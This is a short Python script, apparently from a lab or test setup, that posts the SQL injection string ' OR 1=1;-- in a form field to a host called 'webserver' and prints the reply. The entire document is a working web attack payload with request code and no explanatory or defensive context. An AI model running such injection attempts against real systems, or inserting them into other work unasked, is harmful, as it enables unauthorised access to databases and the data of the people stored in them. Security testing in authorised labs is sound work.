import requests

url = 'http://webserver:80'
payload = "' OR 1=1;--"
data = {'input': payload}

response = requests.post(url, data=data)
print(f"Response: {response.text}")